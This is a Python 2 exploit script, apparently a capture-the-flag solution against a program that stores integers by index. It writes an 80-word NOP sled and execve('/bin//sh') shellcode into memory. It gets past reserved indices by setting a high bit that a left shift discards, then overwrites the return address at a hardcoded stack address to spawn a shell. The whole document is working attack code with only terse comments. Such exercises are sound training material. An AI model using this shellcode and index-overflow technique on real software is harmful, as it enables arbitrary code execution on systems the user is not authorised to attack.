import struct

shell = [
0x6850c031,
0x68732f6e,
0x622f2f68,
0x99e38969,
0xe1895352,
0x80cd0bb0]

# index = $ebp+4
# $ebp+4 = $sp+456
# 114 << 2 == 456
# but 114 (0x72) is reserved
# so have to use 0x40000072 (114 with 31 bit turned to 1)
# the two leftmost bits disappear in a two bit leftshift

# every third index is reserved so we have to
# set the 31 bit.
def getIndex(i):
        return i if i % 3 != 0 else i | 0x40000000

num_nops = 80
for i in range(num_nops):
        print 'store'
        print 0x90909090
        print getIndex(i)

for i,v in enumerate(shell):
        print 'store'
        print v
        print getIndex(i + num_nops)

print 'store'
# override
print 0xffffdb30
print 0x40000072
print 'quit'
